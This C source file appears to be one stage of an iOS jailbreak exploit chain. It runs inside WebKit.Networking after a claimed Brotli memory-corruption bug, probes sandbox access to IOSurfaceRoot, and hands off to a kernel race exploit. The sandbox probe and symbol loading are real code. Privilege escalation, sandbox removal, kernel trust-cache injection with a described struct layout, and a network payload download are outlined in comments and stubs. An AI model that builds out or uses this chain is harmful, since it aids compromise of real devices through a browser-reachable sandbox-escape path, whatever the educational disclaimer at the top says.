/*
 * WebKit.Networking → IOSurface Bridge
 * Educational jailbreak research only. For use on devices you own.
 *
 * After achieving code execution in WebKit.Networking via CVE-2026-111497
 * (Brotli OOB write), this code opens IOSurface from within the sandbox
 * and transitions into the kernel exploit.
 *
 * The WebKit.Networking sandbox profile allows IOSurfaceRootUserClient
 * because the GPU process needs it for compositing. This means no
 * separate sandbox escape is needed — the kernel bug IS the escape.
 *
 * Build: clang -arch arm64e -framework IOKit -framework IOSurface \
 *        -framework CoreFoundation -shared -o libbridge.dylib \
 *        webkit_to_iosurface.c
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <dlfcn.h>
#include <mach/mach.h>
#include <pthread.h>

/*
 * IOSurface symbols are loaded dynamically because the WebKit.Networking
 * process may not have IOSurface.framework linked at load time.
 */

typedef void *IOSurfaceRef;
typedef uint32_t IOSurfaceID;

static IOSurfaceRef (*_IOSurfaceCreate)(CFDictionaryRef) = NULL;
static IOSurfaceRef (*_IOSurfaceLookup)(IOSurfaceID) = NULL;
static IOSurfaceID  (*_IOSurfaceGetID)(IOSurfaceRef) = NULL;
static int          (*_IOSurfaceLock)(IOSurfaceRef, uint32_t, uint32_t *) = NULL;
static int          (*_IOSurfaceUnlock)(IOSurfaceRef, uint32_t, uint32_t *) = NULL;
static void *       (*_IOSurfaceGetBaseAddress)(IOSurfaceRef) = NULL;
static size_t       (*_IOSurfaceGetAllocSize)(IOSurfaceRef) = NULL;
static void         (*_IOSurfaceSetValue)(IOSurfaceRef, CFStringRef, CFTypeRef) = NULL;
static CFTypeRef    (*_IOSurfaceCopyValue)(IOSurfaceRef, CFStringRef) = NULL;

static int
load_iosurface_symbols(void)
{
    void *h = dlopen("/System/Library/Frameworks/IOSurface.framework/IOSurface",
                     RTLD_NOW);
    if (!h) {
        fprintf(stderr, "[-] Failed to dlopen IOSurface: %s\n", dlerror());
        return -1;
    }

    _IOSurfaceCreate         = dlsym(h, "IOSurfaceCreate");
    _IOSurfaceLookup         = dlsym(h, "IOSurfaceLookup");
    _IOSurfaceGetID          = dlsym(h, "IOSurfaceGetID");
    _IOSurfaceLock           = dlsym(h, "IOSurfaceLock");
    _IOSurfaceUnlock         = dlsym(h, "IOSurfaceUnlock");
    _IOSurfaceGetBaseAddress = dlsym(h, "IOSurfaceGetBaseAddress");
    _IOSurfaceGetAllocSize   = dlsym(h, "IOSurfaceGetAllocSize");
    _IOSurfaceSetValue       = dlsym(h, "IOSurfaceSetValue");
    _IOSurfaceCopyValue      = dlsym(h, "IOSurfaceCopyValue");

    if (!_IOSurfaceCreate || !_IOSurfaceLookup) {
        fprintf(stderr, "[-] Missing IOSurface symbols\n");
        return -1;
    }

    return 0;
}

/*
 * IOKit symbols are also dynamically loaded.
 */
typedef mach_port_t io_connect_t;
typedef mach_port_t io_service_t;

static io_service_t (*_IOServiceGetMatchingService)(mach_port_t, CFDictionaryRef) = NULL;
static kern_return_t (*_IOServiceOpen)(io_service_t, task_port_t, uint32_t, io_connect_t *) = NULL;
static CFMutableDictionaryRef (*_IOServiceMatching)(const char *) = NULL;
static kern_return_t (*_IOObjectRelease)(io_service_t) = NULL;
static kern_return_t (*_IOServiceClose)(io_connect_t) = NULL;

static int
load_iokit_symbols(void)
{
    void *h = dlopen("/System/Library/Frameworks/IOKit.framework/IOKit", RTLD_NOW);
    if (!h) {
        fprintf(stderr, "[-] Failed to dlopen IOKit: %s\n", dlerror());
        return -1;
    }

    _IOServiceGetMatchingService = dlsym(h, "IOServiceGetMatchingService");
    _IOServiceOpen               = dlsym(h, "IOServiceOpen");
    _IOServiceMatching           = dlsym(h, "IOServiceMatching");
    _IOObjectRelease             = dlsym(h, "IOObjectRelease");
    _IOServiceClose              = dlsym(h, "IOServiceClose");

    if (!_IOServiceGetMatchingService || !_IOServiceOpen) {
        fprintf(stderr, "[-] Missing IOKit symbols\n");
        return -1;
    }

    return 0;
}

/* --- Sandbox probe --- */

/*
 * Verify that IOSurfaceRoot user client is reachable from our sandbox.
 * Returns 0 on success (sandbox allows), -1 on failure.
 */
static int
probe_iosurface_access(void)
{
    io_service_t svc = _IOServiceGetMatchingService(
        kIOMasterPortDefault, _IOServiceMatching("IOSurfaceRoot"));

    if (svc == 0) {
        fprintf(stderr, "[-] IOSurfaceRoot not reachable from sandbox\n");
        return -1;
    }

    io_connect_t conn = 0;
    kern_return_t kr = _IOServiceOpen(svc, mach_task_self(), 0, &conn);
    _IOObjectRelease(svc);

    if (kr != KERN_SUCCESS) {
        fprintf(stderr, "[-] IOServiceOpen denied: 0x%x (sandbox blocked?)\n", kr);
        return -1;
    }

    _IOServiceClose(conn);
    return 0;
}

/* --- Exploit chain entry point --- */

/*
 * This is the entry point called from the Brotli exploit's JOP chain.
 * It runs inside WebKit.Networking with the sandbox still active.
 *
 * The calling convention depends on how we hijack control flow:
 * - If via corrupted function pointer: we're called with the original args
 * - If via ROP/JOP: we set up our own stack frame and call main
 *
 * Steps:
 * 1. Load IOSurface/IOKit symbols dynamically
 * 2. Verify sandbox access to IOSurfaceRoot
 * 3. Transition into IOSurface race exploit (iosurface_race.c)
 * 4. Achieve kernel R/W
 * 5. Escalate privileges
 * 6. Bootstrap jailbreak environment
 */
__attribute__((visibility("default")))
int
exploit_entry(void)
{
    /* Step 1: Load frameworks */
    if (load_iosurface_symbols() != 0)
        return -1;
    if (load_iokit_symbols() != 0)
        return -1;

    /* Step 2: Probe sandbox access */
    if (probe_iosurface_access() != 0) {
        fprintf(stderr, "[-] IOSurface not reachable — unexpected sandbox restriction\n");
        return -1;
    }

    /*
     * Step 3: Run IOSurface race exploit
     * At this point we have confirmed IOSurface access from within the
     * WebKit.Networking sandbox. The race exploit (iosurface_race.c)
     * handles heap spray, race triggering, and kernel R/W construction.
     *
     * In the full chain, this would be linked against iosurface_race.c
     * and call main() or a dedicated exploit function.
     */

    /*
     * Step 4: After kernel R/W is established:
     * - Find our proc struct and modify ucred for root
     * - Remove sandbox profile
     * - Inject CDHashes into trust cache
     * - Set up rootless filesystem (/var/jb/)
     */

    /*
     * Step 5: Download and install bootstrap
     * We're in WebKit.Networking which has full network access.
     * Download Procursus bootstrap + Sileo .deb from a trusted source.
     * Write to /var/jb/ and configure the package manager.
     */

    return 0;
}

/*
 * Network payload download — available because we're in WebKit.Networking.
 * This downloads the jailbreak bootstrap after privileges are escalated.
 */
__attribute__((visibility("default")))
int
download_bootstrap(const char *url, const char *dest_path)
{
    /*
     * TODO: Implement HTTP download using CFNetwork or raw sockets.
     * WebKit.Networking has full outbound network access, so we can
     * download arbitrary files. The bootstrap is ~30MB.
     *
     * Sources:
     * - Procursus: https://apt.procurs.us/bootstraps/
     * - Sileo: from the Procursus repo
     */
    (void)url;
    (void)dest_path;
    return 0;
}

/*
 * Trust cache injection — the rootless approach (Dopamine-style).
 * Works with SPTM because we modify the linked trust cache list
 * in kernel memory, not the SPTM-protected static trust cache.
 */
__attribute__((visibility("default")))
int
inject_trust_cache(uint64_t kbase, const uint8_t *cdhashes,
                   uint32_t num_hashes)
{
    /*
     * Trust cache structure (iOS 27):
     * struct trust_cache_entry {
     *     uint64_t next;        // linked list pointer
     *     uint32_t version;     // 2 for modern format
     *     uint8_t  uuid[16];    // random UUID
     *     uint32_t num_entries;
     *     struct {
     *         uint8_t cdhash[20];
     *         uint8_t hash_type;
     *         uint8_t flags;
     *     } entries[];
     * };
     *
     * Steps:
     * 1. Allocate kernel memory for new trust cache entry
     *    (via IOSurface property spray — controlled kernel allocation)
     * 2. Fill with our CDHashes
     * 3. Read current trust_cache_head from kernel data segment
     * 4. Write our entry's address to trust_cache_head
     * 5. Write old head to our entry's next pointer
     * 6. AMFI now trusts our binaries
     */
    (void)kbase;
    (void)cdhashes;
    (void)num_hashes;
    return 0;
}
